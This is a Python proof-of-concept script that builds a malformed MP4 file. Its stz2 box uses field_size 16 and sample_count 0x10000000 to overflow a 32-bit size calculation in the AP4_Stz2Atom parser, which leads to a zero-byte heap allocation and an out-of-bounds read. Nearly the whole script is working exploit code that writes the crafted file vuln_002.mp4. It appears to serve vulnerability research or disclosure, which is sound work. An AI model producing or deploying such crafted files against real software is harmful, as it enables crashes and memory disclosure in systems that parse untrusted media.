#!/usr/bin/env python3
"""
PoC generator for VULN-002:
AP4_Stz2Atom integer overflow in (sample_count*m_FieldSize+7)/8 -> heap OOB read

When field_size=16 and sample_count=0x10000000:
  0x10000000 * 16 = 0x100000000 overflows 32-bit to 0
  table_size = (0+7)/8 = 0
  buffer = new unsigned char[0]  (0-byte allocation)
  loop: m_Entries[i] = AP4_BytesToUInt16BE(&buffer[i*2])
  -> buffer[0] is OOB read on a 0-byte heap buffer
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.mp4")


def make_box(fourcc, data=b''):
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc.encode('latin-1') + data


def make_fullbox(fourcc, version, flags, data=b''):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 1 byte version + 3 bytes flags
    return make_box(fourcc, hdr + data)


# ---------------------------------------------------------------------------
# ftyp box
# ---------------------------------------------------------------------------
ftyp_payload = b'mp41' + struct.pack('>I', 0) + b'mp41'
ftyp = make_box('ftyp', ftyp_payload)

# ---------------------------------------------------------------------------
# mvhd (version 0)
# ---------------------------------------------------------------------------
MATRIX_IDENTITY = (
    struct.pack('>I', 0x00010000) +  # a
    struct.pack('>I', 0) +           # b
    struct.pack('>I', 0) +           # u
    struct.pack('>I', 0) +           # c
    struct.pack('>I', 0x00010000) +  # d
    struct.pack('>I', 0) +           # v
    struct.pack('>I', 0) +           # tx
    struct.pack('>I', 0) +           # ty
    struct.pack('>I', 0x40000000)    # w
)
mvhd_payload = (
    struct.pack('>I', 0) +           # creation_time
    struct.pack('>I', 0) +           # modification_time
    struct.pack('>I', 1000) +        # timescale
    struct.pack('>I', 0) +           # duration
    struct.pack('>I', 0x00010000) +  # rate = 1.0
    struct.pack('>H', 0x0100) +      # volume = 1.0
    b'\x00' * 10 +                   # reserved (2 + 8 bytes)
    MATRIX_IDENTITY +                # matrix
    b'\x00' * 24 +                   # pre_defined
    struct.pack('>I', 2)             # next_track_id
)
mvhd = make_fullbox('mvhd', 0, 0, mvhd_payload)

# ---------------------------------------------------------------------------
# tkhd (version 0, flags=3: enabled + in movie)
# ---------------------------------------------------------------------------
tkhd_payload = (
    struct.pack('>I', 0) +           # creation_time
    struct.pack('>I', 0) +           # modification_time
    struct.pack('>I', 1) +           # track_id
    b'\x00' * 4 +                    # reserved
    struct.pack('>I', 0) +           # duration
    b'\x00' * 8 +                    # reserved
    struct.pack('>H', 0) +           # layer
    struct.pack('>H', 0) +           # alternate_group
    struct.pack('>H', 0x0100) +      # volume = 1.0
    b'\x00' * 2 +                    # reserved
    MATRIX_IDENTITY +                # matrix
    struct.pack('>I', 0) +           # width
    struct.pack('>I', 0)             # height
)
tkhd = make_fullbox('tkhd', 0, 3, tkhd_payload)

# ---------------------------------------------------------------------------
# mdhd (version 0)
# ---------------------------------------------------------------------------
mdhd_payload = (
    struct.pack('>I', 0) +           # creation_time
    struct.pack('>I', 0) +           # modification_time
    struct.pack('>I', 44100) +       # timescale
    struct.pack('>I', 0) +           # duration
    struct.pack('>H', 0x15C7) +      # language = 'und'
    struct.pack('>H', 0)             # pre_defined
)
mdhd = make_fullbox('mdhd', 0, 0, mdhd_payload)

# ---------------------------------------------------------------------------
# hdlr (handler type 'soun')
# ---------------------------------------------------------------------------
hdlr_payload = (
    struct.pack('>I', 0) +           # pre_defined
    b'soun' +                        # handler_type
    b'\x00' * 12 +                   # reserved
    b'\x00'                          # name (null string)
)
hdlr = make_fullbox('hdlr', 0, 0, hdlr_payload)

# ---------------------------------------------------------------------------
# smhd (sound media header)
# ---------------------------------------------------------------------------
smhd_payload = struct.pack('>HH', 0, 0)  # balance, reserved
smhd = make_fullbox('smhd', 0, 0, smhd_payload)

# ---------------------------------------------------------------------------
# dinf / dref (self-contained: url with flags=1)
# ---------------------------------------------------------------------------
url_entry = make_fullbox('url ', 0, 1, b'')   # self-contained
dref_payload = struct.pack('>I', 1) + url_entry  # entry_count=1
dref = make_fullbox('dref', 0, 0, dref_payload)
dinf = make_box('dinf', dref)

# ---------------------------------------------------------------------------
# stsd (audio sample description, mp4a)
# ---------------------------------------------------------------------------
mp4a_payload = (
    b'\x00' * 6 +                    # reserved
    struct.pack('>H', 1) +           # data_reference_index
    b'\x00' * 8 +                    # reserved
    struct.pack('>H', 2) +           # channel_count
    struct.pack('>H', 16) +          # sample_size
    struct.pack('>H', 0) +           # pre_defined
    struct.pack('>H', 0) +           # reserved
    struct.pack('>I', 44100 << 16)   # sample_rate (16.16 fixed)
)
mp4a = make_box('mp4a', mp4a_payload)
stsd_payload = struct.pack('>I', 1) + mp4a  # entry_count=1
stsd = make_fullbox('stsd', 0, 0, stsd_payload)

# ---------------------------------------------------------------------------
# stts (time-to-sample, 0 entries)
# ---------------------------------------------------------------------------
stts_payload = struct.pack('>I', 0)  # entry_count=0
stts = make_fullbox('stts', 0, 0, stts_payload)

# ---------------------------------------------------------------------------
# stz2 (THE MALICIOUS BOX)
# field_size=16, sample_count=0x10000000
# Overflow: 0x10000000 * 16 = 0x100000000 wraps to 0 in 32-bit
# table_size = (0+7)/8 = 0 -> 0-byte allocation -> heap OOB read in loop
# ---------------------------------------------------------------------------
FIELD_SIZE   = 16
SAMPLE_COUNT = 0x10000000  # triggers 32-bit overflow in (count * 16)

stz2_payload = (
    b'\x00\x00\x00' +                       # reserved (3 bytes)
    struct.pack('>B', FIELD_SIZE) +          # field_size = 16
    struct.pack('>I', SAMPLE_COUNT)          # sample_count = 0x10000000
)
# stz2 is a FullBox: version(1) + flags(3) + payload
stz2 = make_fullbox('stz2', 0, 0, stz2_payload)

# ---------------------------------------------------------------------------
# stco (chunk offsets, 0 entries)
# ---------------------------------------------------------------------------
stco_payload = struct.pack('>I', 0)  # entry_count=0
stco = make_fullbox('stco', 0, 0, stco_payload)

# ---------------------------------------------------------------------------
# Assemble stbl -> minf -> mdia -> trak -> moov
# ---------------------------------------------------------------------------
stbl = make_box('stbl', stsd + stts + stz2 + stco)
minf = make_box('minf', smhd + dinf + stbl)
mdia = make_box('mdia', mdhd + hdlr + minf)
trak = make_box('trak', tkhd + mdia)
moov = make_box('moov', mvhd + trak)

# ---------------------------------------------------------------------------
# mdat (empty media data)
# ---------------------------------------------------------------------------
mdat = make_box('mdat', b'')

# ---------------------------------------------------------------------------
# Write MP4
# ---------------------------------------------------------------------------
mp4 = ftyp + moov + mdat

with open(OUTPUT, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[+] stz2: field_size={FIELD_SIZE}, sample_count=0x{SAMPLE_COUNT:08X}")
print(f"[+] Expected: 0x{SAMPLE_COUNT:X} * {FIELD_SIZE} = "
      f"0x{(SAMPLE_COUNT * FIELD_SIZE) & 0xFFFFFFFF:X} (32-bit overflow)")
print(f"[+] table_size = (0+7)/8 = 0 -> 0-byte heap allocation -> OOB read")
